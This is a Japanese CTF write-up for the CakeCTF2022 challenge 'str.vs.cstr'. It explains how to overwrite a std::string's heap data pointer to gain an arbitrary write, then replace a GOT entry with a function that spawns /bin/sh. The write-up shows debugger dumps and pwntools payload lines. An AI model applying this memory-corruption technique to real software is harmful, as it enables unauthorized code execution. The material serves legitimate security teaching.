# str.vs.cstr - CakeCTF2022

この問題は`std::string`のデータ構造を利用[^1]してGOT Overwriteで、
`call_me()`関数を呼び出すことが目的。

## 解法
シェルを起動する`call_me()`関数が用意されている。
```cpp
  void call_me() {
    std::system("/bin/sh");
  }
```

16バイト以上の文字列を`std::cin`から入力することで、
`malloc`で別途領域が確保されるようにします。
このデータのポインタを偽のポインタにしてAAWをします。

このとき「偽のポインタ」には適当なGOTのアドレスを指定することで、
GOT Overwriteで`call_me()`を呼び出せます。

```none
gef> x/50xg $rsp
...
0x7fffffffe2a8: 0x0000000000000000      0x0000000000000000
0x7fffffffe2b8: 0x0000000000000000      0x0000000000416eb0
0x7fffffffe2c8: 0x0000000000000010      0x000000000000001e
0x7fffffffe2d8: 0x0041414141414141      0x0000000000000000
```

```none
gef> heap chunks
Chunk(addr=0x405010, size=0x290, flags=PREV_INUSE)
    [0x0000000000405010    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................]
Chunk(addr=0x4052a0, size=0x11c10, flags=PREV_INUSE)
    [0x00000000004052a0    00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00   ................]
Chunk(addr=0x416eb0, size=0x30, flags=PREV_INUSE)
    [0x0000000000416eb0    41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA]
Chunk(addr=0x416ee0, size=0xf130, flags=PREV_INUSE)  <-  top chunk
```

`0x7fffffffe2c0`にある`0x00416eb0`がデータのポインタで、ここを任意のGOTアドレスで書き換えます。
今回は`std::cout`のGOTアドレス`0x404048`を使います。
```none
gef> got
GOT protection: Partial RELRO | GOT functions: 19
           PLT (   Offset)            GOT (   Offset) Symbol -> GOTvalue
    ...
      0x401180 (  +0x1180)       0x404048 (  +0x4048) _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4  ->  0x401090
      0x401190 (  +0x1190)       0x404050 (  +0x4050) _ZNSolsEPFRSoS_E@GLIBCXX_3.4  ->  0x4010a0
      0x4011a0 (  +0x11a0)       0x404058 (  +0x4058) __stack_chk_fail@GLIBC_2.4  ->  0x4010b0
    ...
      0x401200 (  +0x1200)       0x404088 (  +0x4088) _Unwind_Resume@GCC_3.0  ->  0x401110
```

上記を満たすpayloadを作成すると、データのポインタが書き換わってることが確認できます。
```python
choice("1")
setcstr(b"\x90"*0x20+ p64(e.got["_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc"])) #404048
```

```none
0x7fffffffe298: 0x0000000000000000     0x9090909090909090
0x7fffffffe2a8: 0x9090909090909090     0x9090909090909090
0x7fffffffe2b8: 0x9090909090909090     0x0000000000404048
0x7fffffffe2c8: 0x0000000000000000     0x000000000000001e
0x7fffffffe2d8: 0x0041414141414141     0x0000000000000000
```

あとは`call_me()`関数のアドレスを書き込みばシェルを起動することができます。
```python
choice("3")
setstr(p64(e.sym["_ZN4Test7call_meEv"]))
```
```none
gef> x/xg 0x0000000000404048
0x404048 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@got.plt>:       0x00000000004016de
```

[^1]: https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#stdstring
